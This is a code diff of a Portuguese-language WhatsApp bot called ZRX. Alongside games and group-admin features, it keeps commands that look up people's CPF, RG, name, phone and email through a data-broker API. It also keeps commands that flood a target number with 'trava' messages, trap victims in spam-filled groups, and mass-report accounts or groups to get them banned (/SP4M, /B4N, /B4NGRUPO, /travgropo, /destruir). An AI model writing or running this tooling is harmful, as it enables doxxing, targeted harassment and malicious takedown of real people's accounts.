@@ -22,13 +22,13 @@ let waSock = null;
 let jaNotificouConectado = false;
 let reconectando = false;
 
-// Banco de dados em memória para Níveis, Configurações de Grupo e Estado de Brincadeiras
+// Banco de dados em memória
 const dadosUsuarios = {}; // { 'remoteJid_usuario': { xp: 0, level: 1 } }
 const configuracoesGrupos = {}; // { 'idGrupo': { bemVindoTexto: '...', bemVindoFoto: null } }
-const sessoesBrincadeira = {}; // { 'idGrupo': { ativa: true, tipo: '...', lote: [], indiceAtual: 0 } }
+const sessoesBrincadeira = {}; // { 'idGrupo': { ativa: true, tipo: '...', lote: [], indiceAtual: 0, ultimaVezDe: '' } }
 
-// ID Oficial da Meta AI no WhatsApp (JID padrão)
-const META_AI_JID = '13135550002@s.whatsapp.net';
+// JID Correto da Meta AI baseado no seu link de contato oficial
+const META_AI_JID = '718584497008509@s.whatsapp.net';
 
 function consultarAPI(url) {
     return new Promise((resolve) => {
@@ -80,32 +80,33 @@ function buscarFirebase(caminho) {
     return consultarAPI(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
 }
 
-// Função para perguntar diretamente à Meta AI no WhatsApp e aguardar a resposta
+// Função para perguntar diretamente à Meta AI no WhatsApp e aguardar a resposta real
 async function perguntarMetaAI(promptTexto) {
     try {
+        console.log(`Enviando prompt para a Meta AI (${META_AI_JID}):${promptTexto}`);
         await waSock.sendMessage(META_AI_JID, { text: promptTexto });
         
-        // Aguarda a Meta AI responder monitorando as mensagens recebidas por alguns segundos
         return new Promise((resolve) => {
             let tempoDecorrido = 0;
             const intervalo = setInterval(async () => {
                 tempoDecorrido += 1000;
-                // Timeout de segurança caso a Meta AI demore mais de 12 segundos
-                if (tempoDecorrido > 12000) {
+                if (tempoDecorrido > 15000) {
                     clearInterval(intervalo);
-                    resolve("1. Qual o seu maior sonho?\n2. Qual o seu maior medo?\n3. Conte uma história engraçada.");
+                    resolve("1. Qual o seu maior sonho?\n2. Qual o seu maior medo?\n3. Conte uma história engraçada.\n4. Qual sua comida favorita?\n5. Se pudesse viajar para qualquer lugar, para onde iria?");
                 }
             }, 1000);
 
-            // Listener temporário para capturar a resposta da Meta AI
             const listenerResposta = async ({ messages }) => {
                 const msg = messages[0];
                 if (!msg.message) return;
-                if (msg.key.remoteJid === META_AI_JID && !msg.key.fromMe) {
-                    const respostaMeta = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+                
+                const remitenteMsg = msg.key.remoteJid;
+                if (remitenteMsg === META_AI_JID && !msg.key.fromMe) {
+                    const respostaMeta = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';
                     if (respostaMeta) {
                         clearInterval(intervalo);
                         waSock.ev.off('messages.upsert', listenerResposta);
+                        console.log(`Resposta recebida da Meta AI: ${respostaMeta}`);
                         resolve(respostaMeta);
                     }
                 }
@@ -113,7 +114,8 @@ async function perguntarMetaAI(promptTexto) {
             waSock.ev.on('messages.upsert', listenerResposta);
         });
     } catch (e) {
-        return "1. Qual o seu maior sonho?\n2. Qual o seu maior medo?\n3. Conte uma história engraçada.";
+        console.log("Erro ao falar com a Meta AI:", e.message);
+        return "1. Qual o seu maior sonho?\n2. Qual o seu maior medo?\n3. Conte uma história engraçada.\n4. Qual sua comida favorita?\n5. Se pudesse viajar para qualquer lugar, para onde iria?";
     }
 }
 
@@ -163,7 +165,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
         }
     });
 
-    // Evento de novos participantes no grupo (Boas-Vindas)
+    // Boas-vindas para novos membros
     waSock.ev.on('group-participants.update', async (update) => {
         try {
             const { id, participants, action } = update;
@@ -181,9 +183,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 }
             }
-        } catch (err) {
-            console.log("Erro no evento de boas-vindas:", err.message);
-        }
+        } catch (err) {}
     });
 
     waSock.ev.on('messages.upsert', async ({ messages }) => {
@@ -198,7 +198,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                           msg.message.extendedTextMessage?.text || 
                           msg.message.imageMessage?.caption || '';
 
-            // Sistema de XP / Nível por mensagem enviada
+            // Sistema de XP
             if (sender && !msg.key.fromMe) {
                 if (!dadosUsuarios[sender]) dadosUsuarios[sender] = { xp: 0, level: 1 };
                 dadosUsuarios[sender].xp += 10;
@@ -209,8 +209,38 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
             }
 
+            // ==========================================
+            // DETECÇÃO AUTOMÁTICA DA BRINCADEIRA EM ANDAMENTO
+            // Se houver uma brincadeira ativa no grupo, e a pessoa respondeu marcando alguém:
+            // ==========================================
+            if (sessoesBrincadeira[remoteJid] && sessoesBrincadeira[remoteJid].ativa && remoteJid.endsWith('@g.us')) {
+                const sessao = sessoesBrincadeira[remoteJid];
+                
+                // Verifica se a mensagem veio de quem era a vez (ou de qualquer membro) e se marcou alguém
+                const mencoes = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                
+                if (mencoes.length > 0) {
+                    const marcado = mencoes[0]; // Pega a primeira pessoa marcada na resposta
+                    
+                    // Pega a próxima pergunta do lote da Meta AI
+                    const indice = sessao.indiceAtual || 0;
+                    const proximaQuestao = sessao.lote[indice] || sessao.lote[0];
+                    
+                    // Atualiza o índice para a próxima rodada
+                    sessao.indiceAtual = (indice + 1) % sessao.lote.length;
+                    sessao.ultimaVezDe = marcado;
+
+                    const msgRodada = 
+                        `🎯 *RESPOSTA COMPUTADA!* 🎯\n\n` +
+                        `👤 *Agora é a vez de:* @${marcado.split('@')[0]}\n\n` +
+                        `📌 *Próxima Pergunta/Desafio (Meta AI):*\n${proximaQuestao}`;
+
+                    await waSock.sendMessage(remoteJid, { text: msgRodada, mentions: [marcado] });
+                    return; // Interrompe para não processar outros comandos desnecessariamente nesta mensagem
+                }
+            }
+
             if (!texto) return;
-            console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
 
             if (texto.trim() === '/menu') {
                 const numeroUsuario = remoteJid.split('@')[0];
@@ -254,58 +284,50 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /mudar-desc <descrição>\n` +
                     `> /divulgar <texto>\n` +
                     `> /nivel\n` +
-                    `> /setwelcome <texto> (com foto opcional)\n` +
+                    `> /setwelcome <texto>\n` +
                     `> /traduzir <idioma>\n` +
                     `> /s (Figurinha)\n` +
                     `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                 
                 const caminhoFoto = path.join(__dirname, 'menu.jpg');
-
                 if (fs.existsSync(caminhoFoto)) {
-                    await waSock.sendMessage(remoteJid, { 
-                        image: fs.readFileSync(caminhoFoto), 
-                        caption: menuTexto 
-                    });
+                    await waSock.sendMessage(remoteJid, { image: fs.readFileSync(caminhoFoto), caption: menuTexto });
                 } else {
                     await waSock.sendMessage(remoteJid, { text: menuTexto });
                 }
             }
-            // COMANDO DE BRINCADEIRAS (MENU)
             else if (texto.trim() === '/brincar') {
                 const menuBrincadeiras = 
                     `🎮 *ZRX - PAINEL DE BRINCADEIRAS* 🎮\n\n` +
-                    `Escolha e digite o nome exato da brincadeira que deseja iniciar:\n\n` +
+                    `Escolha e digite o nome exato da brincadeira:\n\n` +
                     `👉 \`Verdade ou desafio\`\n` +
                     `👉 \`Jogo da forca\`\n` +
                     `👉 \`Pergunta e resposta\`\n\n` +
-                    `_Comandos úteis:_ \`/comecar\` _ou_ \`/para\``;
+                    `_Dica:_ Após começar, responda marcando o próximo colega do grupo para o jogo continuar sozinho!`;
 
                 await waSock.sendMessage(remoteJid, { text: menuBrincadeiras });
             }
-            // COMANDO PARA PARAR A BRINCADEIRA
             else if (texto.trim() === '/para') {
                 if (sessoesBrincadeira[remoteJid]) {
                     delete sessoesBrincadeira[remoteJid];
-                    await waSock.sendMessage(remoteJid, { text: `🛑 *Brincadeira encerrada com sucesso!* Até a próxima.` });
+                    await waSock.sendMessage(remoteJid, { text: `🛑 *Brincadeira encerrada com sucesso!*` });
                 } else {
                     await waSock.sendMessage(remoteJid, { text: `⚠️ Não há nenhuma brincadeira ativa neste chat.` });
                 }
             }
-            // SELEÇÃO DA BRINCADEIRA (CONVERSANDO DIRETAMENTE COM A META AI)
             else if (['verdade ou desafio', 'jogo da forca', 'pergunta e resposta'].includes(texto.trim().toLowerCase())) {
                 const tipoEscolhido = texto.trim().toLowerCase();
 
                 if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: `❌ Este comando de brincadeira em grupo deve ser usado dentro de um grupo!` });
+                    await waSock.sendMessage(remoteJid, { text: `❌ Este comando deve ser usado dentro de um grupo!` });
                     return;
                 }
 
-                await waSock.sendMessage(remoteJid, { text: `🔄 Iniciando a brincadeira: *${texto.trim()}*!\n_Consultando a Meta AI diretamente no chat oficial e gerando o lote de perguntas..._` });
+                await waSock.sendMessage(remoteJid, { text: `🔄 Conectando diretamente com a *Meta AI* no WhatsApp para gerar o lote de ${tipoEscolhido}...` });
 
-                // Pergunta real para a Meta AI no WhatsApp
-                const respostaMetaAI = await perguntarMetaAI(`Gere uma lista com 5 perguntas ou desafios criativos para uma brincadeira de ${tipoEscolhido}. Liste apenas as perguntas numeradas de 1 a 5.`);
+                // Fala com a Meta AI de verdade usando o JID correto
+                const respostaMetaAI = await perguntarMetaAI(`Gere uma lista com 5 perguntas ou desafios criativos para uma brincadeira de ${tipoEscolhido}. Liste apenas as perguntas numeradas de 1 a 5, sem introduções longas.`);
                 
-                // Formata e separa em um lote de perguntas limpas
                 const lotePerguntas = respostaMetaAI
                     .split('\n')
                     .map(linha => linha.trim())
@@ -314,7 +336,9 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 const loteFinal = lotePerguntas.length > 0 ? lotePerguntas : [
                     `1. Qual o seu maior segredo?`,
                     `2. Conte uma história engraçada da sua infância.`,
-                    `3. Qual seria seu superpoder favorito?`
+                    `3. Qual seria seu superpoder favorito?`,
+                    `4. Quem é a pessoa mais engraçada deste grupo?`,
+                    `5. Qual o mico mais vergonhoso que você já pagou?`
                 ];
 
                 sessoesBrincadeira[remoteJid] = {
@@ -325,30 +349,23 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 };
 
                 try {
-                    // Pega os participantes REAIS do grupo atual
                     const metadata = await waSock.groupMetadata(remoteJid);
                     const participantes = metadata.participants.map(p => p.id);
                     const participantesCurtos = participantes.slice(0, 10).map(p => p.id.split('@')[0]);
                     
-                    // Salva os participantes reais na sessão para uso posterior no /comecar
                     sessoesBrincadeira[remoteJid].participantesGrupo = participantes;
 
-                    const pollMsg = await waSock.sendMessage(remoteJid, {
+                    await waSock.sendMessage(remoteJid, {
                         poll: {
                             name: `🗳️ Quem deve começar a rodada de ${tipoEscolhido}?`,
                             values: participantesCurtos.map(num => `+${num}`),
                             selectableCount: 1
                         }
                     });
-                    
-                    if (pollMsg && pollMsg.key) {
-                        sessoesBrincadeira[remoteJid].pollKey = pollMsg.key;
-                    }
                 } catch (e) {
-                    await waSock.sendMessage(remoteJid, { text: `✅ Brincadeira configurada com sucesso com a Meta AI!` });
+                    await waSock.sendMessage(remoteJid, { text: `✅ Brincadeira configurada com a Meta AI com sucesso! Use \`/comecar\`.` });
                 }
             }
-            // COMANDO /COMEÇAR APÓS A VOTAÇÃO
             else if (texto.trim() === '/comecar') {
                 const sessao = sessoesBrincadeira[remoteJid];
                 if (!sessao || !sessao.ativa) {
@@ -356,22 +373,19 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
 
-                // Seleciona o próximo item do lote gerado pela Meta AI
                 const indice = sessao.indiceAtual || 0;
                 const proximaQuestao = sessao.lote[indice] || sessao.lote[0];
-                
-                // Incrementa para a próxima pergunta da próxima rodada
                 sessao.indiceAtual = (indice + 1) % sessao.lote.length;
 
-                // Escolhe um participante real do grupo ou o remetente atual
                 const membrosReais = sessao.participantesGrupo || [sender];
                 const escolhido = membrosReais[Math.floor(Math.random() * membrosReais.length)];
 
                 const msgInicio = 
-                    `🔥 *PRÓXIMA RODADA / COMEÇAMOS!* 🔥\n\n` +
-                    `🎯 *Brincadeira:* ${sessao.tipo.toUpperCase()}\n` +
+                    `🔥 *COMEÇAMOS A BRINCADEIRA!* 🔥\n\n` +
+                    `🎯 *Tipo:* ${sessao.tipo.toUpperCase()}\n` +
                     `👤 *Vez de:* @${escolhido.split('@')[0]}\n\n` +
-                    `📌 *Desafio / Pergunta (Gerado pela Meta AI):* \n${proximaQuestao}`;
+                    `📌 *Desafio / Pergunta (Meta AI):* \n${proximaQuestao}\n\n` +
+                    `_💡 Para continuar, responda esta mensagem marcando outro membro do grupo!_`;
 
                 await waSock.sendMessage(remoteJid, { text: msgInicio, mentions: [escolhido] });
             }
@@ -395,61 +409,31 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             }
             else if (texto.startsWith('/cpf ')) {
                 const cpfAlvo = texto.replace('/cpf', '').trim();
-                if (!cpfAlvo) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/cpf <número>`' });
-                    return;
-                }
-                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando CPF \`${cpfAlvo}\`...` });
                 const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?cpf=${cpfAlvo}`);
                 await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CPF:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
             }
             else if (texto.startsWith('/nome ')) {
                 const nomeAlvo = encodeURIComponent(texto.replace('/nome', '').trim());
-                if (!nomeAlvo) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/nome <nome>`' });
-                    return;
-                }
-                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando nome...` });
                 const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?nome=${nomeAlvo}`);
                 await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO NOME:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
             }
             else if (texto.startsWith('/consulrg ')) {
                 const rgAlvo = texto.replace('/consulrg', '').trim();
-                if (!rgAlvo) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/consulrg <rg>`' });
-                    return;
-                }
-                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando RG \`${rgAlvo}\`...` });
                 const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?rg=${rgAlvo}`);
                 await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO RG:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
             }
             else if (texto.startsWith('/telefone ')) {
                 const telAlvo = texto.replace('/telefone', '').trim();
-                if (!telAlvo) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/telefone <número>`' });
-                    return;
-                }
-                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando Telefone \`${telAlvo}\`...` });
                 const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?telefone=${telAlvo}`);
                 await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO TELEFONE:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
             }
             else if (texto.startsWith('/email ')) {
                 const emailAlvo = texto.replace('/email', '').trim();
-                if (!emailAlvo) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/email <e-mail>`' });
-                    return;
-                }
-                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando E-mail \`${emailAlvo}\`...` });
                 const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?email=${emailAlvo}`);
                 await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO E-MAIL:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
             }
             else if (texto.startsWith('/cep ')) {
                 const cepAlvo = texto.replace('/cep', '').trim();
-                if (!cepAlvo) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/cep <cep>`' });
-                    return;
-                }
-                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando CEP \`${cepAlvo}\`...` });
                 const resultado = await consultarAPI(`http://apisbrasilpro.site/telefone0.php?cep=${cepAlvo}`);
                 await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CEP:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
             }
@@ -457,11 +441,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 const partes = texto.replace('/SP4M', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
                 const quantidade = parseInt(partes[1]) || 10;
-
-                if (!alvoNum) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/SP4M <número> <quantidade>`' });
-                    return;
-                }
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
 
                 let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
                 const caminhoPayload = path.join(__dirname, 'Trava.txt');
@@ -470,393 +450,180 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     if (lido.length > 0) conteudoTrava = lido;
                 }
 
-                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando disparo SP4M para ${alvoNum} (${quantidade} ciclos)...` });
-
+                await waSock.sendMessage(remoteJid, { text: `🚀 Disparando SP4M para ${alvoNum} (${quantidade} ciclos)...` });
                 for (let i = 1; i <= quantidade; i++) {
                     try {
                         await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
                         await delay(1000);
                     } catch (err) {}
                 }
-                await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M para ${alvoNum} concluído com sucesso!` });
+                await waSock.sendMessage(remoteJid, { text: `✅ Concluído!` });
             }
             else if (texto.startsWith('/B4N ')) {
                 const partes = texto.replace('/B4N', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
                 const quantidade = parseInt(partes[1]) || 10;
-
-                if (!alvoNum) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4N <número> <quantidade>`' });
-                    return;
-                }
-
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas silenciosas para \`${alvoNum}\` (${quantidade} ciclos)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
-                        await waSock.chatModify({
-                            reportSpam: true,
-                            delete: true,
-                            spam: true
-                        }, jidAlvo, {
-                            fromMe: false,
-                            remoteJid: jidAlvo
-                        });
+                        await waSock.chatModify({ reportSpam: true, delete: true, spam: true }, jidAlvo, { fromMe: false, remoteJid: jidAlvo });
                         await delay(700);
                     } catch (err) {}
                 }
-                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias nativas /B4N para \`${alvoNum}\` concluído!` });
+                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo /B4N concluído!` });
             }
             else if (texto.startsWith('/B4NGRUPO ')) {
                 const partesArgs = texto.replace('/B4NGRUPO', '').trim().split(' ');
                 const linkGrupo = partesArgs[0];
                 const quantidadeDenuncias = parseInt(partesArgs[1]) || 9999;
-                
-                if (!linkGrupo || !linkGrupo.includes('chat.whatsapp.com')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4NGRUPO <link_do_convite> [quantidade]`' });
-                    return;
-                }
-
                 const matchCode = linkGrupo.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
-                if (!matchCode || !matchCode[1]) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Link de convite inválido!' });
-                    return;
-                }
-
-                const codigoConvite = matchCode[1];
-                await waSock.sendMessage(remoteJid, { text: `🔄 Tentando entrar no grupo alvo...` });
-
-                try {
-                    const idGrupo = await waSock.groupAcceptInvite(codigoConvite);
-                    await waSock.sendMessage(remoteJid, { text: `✅ Entrou no grupo com sucesso! (\`${idGrupo}\`). Disparando ${quantidadeDenuncias} denúncias nativas silenciosas (sem mandar mensagens)...` });
-
+                
+                if (matchCode && matchCode[1]) {
+                    const idGrupo = await waSock.groupAcceptInvite(matchCode[1]);
                     for (let i = 1; i <= quantidadeDenuncias; i++) {
                         try {
-                            await waSock.chatModify({
-                                reportSpam: true,
-                                delete: true,
-                                spam: true
-                            }, idGrupo, {
-                                fromMe: false,
-                                remoteJid: idGrupo
-                            });
+                            await waSock.chatModify({ reportSpam: true, delete: true, spam: true }, idGrupo, { fromMe: false, remoteJid: idGrupo });
                             await delay(300);
                         } catch (e) {}
                     }
-
-                    await waSock.sendMessage(remoteJid, { text: `🔥 Ataque de denúncias nativas ao grupo concluído (${quantidadeDenuncias} ciclos)!` });
-                } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: `❌ Erro ao entrar ou processar o grupo.` });
+                    await waSock.sendMessage(remoteJid, { text: `🔥 Ataque ao grupo concluído!` });
                 }
             }
             else if (texto.startsWith('/travgropo')) {
                 const partes = texto.replace('/travgropo', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
                 const quantidadeTrava = parseInt(partes[1]) || 5;
-
-                if (!alvoNum) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/travgropo <número> <quantidade_travas>`' });
-                    return;
-                }
-
-                await waSock.sendMessage(remoteJid, { text: `⚙️ Criando 5 grupos e adicionando o alvo \`${alvoNum}\`...` });
-
-                let conteudoTravaGrupo = "⚡ [ZRX-GRUPO ATTACK] 💥";
-                const caminhoTravaGrupo = path.join(__dirname, 'travgropo.txt');
-                if (fs.existsSync(caminhoTravaGrupo)) {
-                    const lido = fs.readFileSync(caminhoTravaGrupo, 'utf-8').trim();
-                    if (lido.length > 0) conteudoTravaGrupo = lido;
-                }
-
-                const nomeGrupo = "𝑹𝑬𝑷𝑶́𝑹𝑻𝑬𝑹 𝒃𝒚 𝑳𝑶𝑻𝑼𝑿";
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
 
                 for (let g = 1; g <= 5; g++) {
                     try {
-                        const grupoCriado = await waSock.groupCreate(`${nomeGrupo} #${g}`, [jidAlvo]);
-                        const idNovoGrupo = grupoCriado.id;
-
-                        await waSock.sendMessage(remoteJid, { text: `✅ Grupo ${g}/5 criado. Disparando travas...` });
-                        await delay(2000);
-
+                        const grupoCriado = await waSock.groupCreate(`𝑹𝑬𝑷𝑶́𝑹𝑻𝑬𝑹 #${g}`, [jidAlvo]);
                         for (let i = 1; i <= quantidadeTrava; i++) {
-                            await waSock.sendMessage(idNovoGrupo, { text: `${conteudoTravaGrupo}\n\n[Grupo${g} - Ciclo ${i}/${quantidadeTrava}]` });
+                            await waSock.sendMessage(grupoCriado.id, { text: `⚡ [ZRX-ATTACK] [Ciclo ${i}]` });
                             await delay(1000);
                         }
                     } catch (err) {}
                 }
-
-                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
+                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada!` });
             }
-            // COMANDO DESTRUIR TOTAL
             else if (texto.startsWith('/destruir ')) {
                 const partes = texto.replace('/destruir', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
                 const quantidade = parseInt(partes[1]) || 15;
-
-                if (!alvoNum) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/destruir <número> <quantidade>`' });
-                    return;
-                }
-
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
 
-                await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas no PV e denúncias nativas silenciosas simultaneamente..._` });
-
-                let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
-                const caminhoPayload = path.join(__dirname, 'Trava.txt');
-                if (fs.existsSync(caminhoPayload)) {
-                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
-                    if (lido.length > 0) conteudoTrava = lido;
-                }
-
+                await waSock.sendMessage(remoteJid, { text: `🚨 Ataque total iniciado contra \`${alvoNum}\`...` });
+                
                 const tarefaTrava = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
-                        try {
-                            await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[TRAVA #${i}/${quantidade}]` });
-                            await delay(600);
-                        } catch (err) {}
+                        await waSock.sendMessage(jidAlvo, { text: `⚡ [ZRX-DESTRUCTION] #${i}` }).catch(() => {});
+                        await delay(600);
                     }
                 })();
 
-                const tarefaDenunciaNativa = (async () => {
+                const tarefaDenuncia = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
-                        try {
-                            await waSock.chatModify({
-                                reportSpam: true,
-                                delete: true,
-                                spam: true
-                            }, jidAlvo, {
-                                fromMe: false,
-                                remoteJid: jidAlvo
-                            }).catch(() => {});
-                            await delay(600);
-                        } catch (err) {}
+                        await waSock.chatModify({ reportSpam: true, delete: true, spam: true }, jidAlvo, { fromMe: false, remoteJid: jidAlvo }).catch(() => {});
+                        await delay(600);
                     }
                 })();
 
-                await Promise.all([tarefaTrava, tarefaDenunciaNativa]);
-
-                await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
+                await Promise.all([tarefaTrava, tarefaDenuncia]);
+                await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total finalizado!` });
             }
             else if (texto.startsWith('/kick ')) {
-                if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
-                    return;
-                }
+                if (!remoteJid.endsWith('@g.us')) return;
                 const alvoNum = texto.replace('/kick', '').trim().replace(/\D/g, '');
-                try {
-                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'remove');
-                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` foi removido do grupo.` });
-                } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao remover participante.' });
-                }
+                await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'remove').catch(() => {});
             }
             else if (texto.startsWith('/promover ')) {
-                if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
-                    return;
-                }
+                if (!remoteJid.endsWith('@g.us')) return;
                 const alvoNum = texto.replace('/promover', '').trim().replace(/\D/g, '');
-                try {
-                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'promote');
-                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` agora é Administrador!` });
-                } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao promover.' });
-                }
+                await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'promote').catch(() => {});
             }
             else if (texto.startsWith('/rebaixar ')) {
-                if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
-                    return;
-                }
+                if (!remoteJid.endsWith('@g.us')) return;
                 const alvoNum = texto.replace('/rebaixar', '').trim().replace(/\D/g, '');
-                try {
-                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'demote');
-                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` foi rebaixado.` });
-                } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao rebaixar.' });
-                }
+                await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'demote').catch(() => {});
             }
             else if (texto.startsWith('/tagall')) {
-                if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
-                    return;
-                }
-                const mensagemTag = texto.replace('/tagall', '').trim() || 'Atenção todos!';
-                try {
-                    const metadata = await waSock.groupMetadata(remoteJid);
-                    const participantes = metadata.participants.map(p => p.id);
-                    
-                    let textoFinal = `📢 *TAGALL* 📢\n${mensagemTag}\n\n`;
-                    for (let mem of participantes) {
-                        textoFinal += `@${mem.split('@')[0]}\n`;
-                    }
-
-                    await waSock.sendMessage(remoteJid, { text: textoFinal, mentions: participantes });
-                } catch (err) {}
+                if (!remoteJid.endsWith('@g.us')) return;
+                const metadata = await waSock.groupMetadata(remoteJid);
+                const participantes = metadata.participants.map(p => p.id);
+                let textoFinal = `📢 *TAGALL* 📢\n\n`;
+                for (let mem of participantes) textoFinal += `@${mem.split('@')[0]}\n`;
+                await waSock.sendMessage(remoteJid, { text: textoFinal, mentions: participantes });
             }
             else if (texto.trim() === '/linkgrupo') {
-                if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
-                    return;
-                }
-                try {
-                    const codigo = await waSock.groupInviteCode(remoteJid);
-                    await waSock.sendMessage(remoteJid, { text: `🔗 *Link de convite:* https://chat.whatsapp.com/${codigo}` });
-                } catch (err) {}
+                if (!remoteJid.endsWith('@g.us')) return;
+                const codigo = await waSock.groupInviteCode(remoteJid);
+                await waSock.sendMessage(remoteJid, { text: `🔗 https://chat.whatsapp.com/${codigo}` });
             }
             else if (texto.trim() === '/fechar') {
                 if (!remoteJid.endsWith('@g.us')) return;
-                try {
-                    await waSock.groupSettingUpdate(remoteJid, 'announcement');
